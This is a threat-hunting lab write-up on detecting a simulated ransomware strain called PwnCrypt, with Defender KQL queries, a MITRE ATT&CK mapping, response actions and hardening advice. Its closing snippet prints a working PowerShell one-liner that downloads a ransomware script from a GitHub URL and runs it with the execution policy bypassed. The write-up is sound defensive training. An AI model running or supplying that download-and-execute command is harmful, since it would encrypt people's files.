# 🎯 Threat Hunting Project: Detecting PwnCrypt Ransomware

## 1. 🧭 Preparation

**Goal:**  
Set up the hunt by defining what you're looking for.

A new ransomware strain named **PwnCrypt** has been reported in the news. It leverages a **PowerShell-based payload** to encrypt files using **AES-256 encryption**. It specifically targets directories like `C:\Users\Public\Desktop`, renaming files to include the `.pwncrypt` marker (e.g., `hello.txt` becomes `hello.pwncrypt.txt`). The CISO suspects a potential infection within the corporate network.

**Hypothesis:**  
Due to an immature security posture and a lack of user training, PwnCrypt may have infiltrated the environment. Begin hunting for files with the `.pwncrypt.` marker.

**Indicators of Compromise (IOCs):**
- `.pwncrypt` extension
- File path: `C:\Users\Public\Desktop`
- Payload location: `C:\ProgramData\pwncrypt.ps1`

---

## 2. 📥 Data Collection

**Goal:**  
Gather relevant data from logs, network traffic, and endpoints.

**Activity:**  
Ensure logs are available in key Microsoft Defender tables:
- `DeviceProcessEvents`
- `DeviceFileEvents`

**KQL Used:**
```kql
DeviceFileEvents
| where DeviceName == "nessa-windows"
| where FileName has "pwncrypt"
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessFileName
| order by Timestamp desc
```
<img width="1051" alt="Screenshot 2025-05-14 at 5 29 45 PM" src="https://github.com/user-attachments/assets/0c1cdcda-b155-4cd3-b55f-18d55b4a892c" />

---

### 3. 🔍 Data Analysis

**🎯 Goal:**  
Analyze data to test the hypothesis and identify the attack vector.


#### ✅ Confirmed Observations:
- `PwnCrypt` executed via PowerShell.
- Files were created and renamed by the ransomware.


#### 📊 KQL Queries Used:

```kql
let VMName = "nessa-windows";
let specifictime = datetime(2025-07-14T14:03:58.2787296Z);
DeviceFileEvents
| where DeviceName == vmname
| where Timestamp between ((specifictime - 5m) . . (specifictime + 5m))
| where InitiatingProcessCommandLine contains "pwncrypt" or FolderPath contains "pwncrypt"
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine
```
<img width="1299" alt="Screenshot 2025-05-14 at 5 55 06 PM" src="https://github.com/user-attachments/assets/ac358078-808a-4938-917d-d4d8d0e8c37f" />

```kql
let specifictime = datetime(2025-07-14T14:03:58.3686631Z);
DeviceProcessEvents
| where DeviceName == "nessa-windows"
| where Timestamp between ((specifictime - 5m)..(specifictime + 5m ))
| where InitiatingProcessCommandLine contains "pwncrypt" or FolderPath contains "pwncrypt"
| project Timestamp, DeviceId, DeviceName, ActionType, FileName, InitiatingProcessCommandLine
```

<img width="1299" alt="Screenshot 2025-05-14 at 5 55 06 PM" src="https://github.com/user-attachments/assets/529e697f-ef2e-4376-a02b-56189f1e4336" />

---

### 4. 🔎 Investigation

**🎯 Goal:**  
Investigate any suspicious findings and map them to MITRE ATT&CK TTPs.


#### 🧠 MITRE ATT&CK Mapping:

| Tactic           | Technique                         | Technique ID   | Justification                                                                 |
|------------------|-----------------------------------|----------------|-------------------------------------------------------------------------------|
| Execution        | PowerShell                        | T1059.001      | `powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1`   |
| Defense Evasion  | Obfuscated Files or Information   | T1027          | Use of `-ExecutionPolicy Bypass` in PowerShell                               |
| Defense Evasion  | Masquerading                      | T1036          | Potential disguise of `pwncrypt.ps1`                                         |
| Persistence      | Boot/Logon Scripts                | T1037.005      | Possible if script is configured to persist (not confirmed)                  |
| Discovery        | File and Directory Discovery      | T1083          | Implied ransomware behavior to enumerate encryptable files                   |
| Collection       | Data Staged                       | T1074          | Files renamed and staged for encryption                                      |
| Impact           | Data Encrypted for Impact         | T1486          | Files encrypted and renamed `.pwncrypt`                                      |
| Impact           | Inhibit System Recovery           | T1490          | Potential tactic inferred from ransomware nature                             |

---

### 5. 🛡️ Response

**🎯 Goal:**  
Mitigate any confirmed threats.


#### ✅ Actions Taken:

- **Isolated infected host** `nessa-windows`) to prevent lateral movement.
- **Terminated malicious PowerShell process** running `pwncrypt.ps1`.
- **Removed ransomware script** from `C:\ProgramData`.
- **Searched the environment** for indicators of compromise (IOCs), such as `.pwncrypt` extensions and suspicious PowerShell usage.
- **Alerted the Incident Response (IR) team** and shared related MITRE ATT&CK mappings.
- **Recovered impacted files** from backups.

---

### 6. 📝 Documentation

**🎯 Goal:**  
Document findings and outcomes for future reference and process improvement.


#### 🗂️ Summary of Actions:

- **Confirmed ransomware execution** via PowerShell using IOC-driven analysis.
- **Documented TTPs** and mapped them to relevant **MITRE ATT&CK techniques**.
- **Logged all KQL queries** and recorded actions in the **incident timeline**.

---

### 7. 🔄 Improvement

**🎯 Goal:**  
Refine security strategy and improve future hunts.


#### Prevention Recommendations

**PowerShell Hardening**
- Enforce **Constrained Language Mode**.
- Enable **Script Block Logging** and **Module Logging**.

**Execution Control**
- Implement **AppLocker** or **Windows Defender Application Control (WDAC)**.
- Restrict **write/execute permissions** to `C:\ProgramData`.

**User Awareness**
- Launch **security training** to mitigate phishing and unsafe script execution.

**Behavioral Detection**
- Create alerts for:
  - File renames with **unusual extensions** (e.g., `.pwncrypt`).
  - PowerShell executions using `-ExecutionPolicy Bypass`.
 
---

### **Ransomware Command Snapshot**  
⚠️ Example of how the ransomware script was executed:  
```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1' -OutFile 'C:\programdata\pwncrypt.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1
```
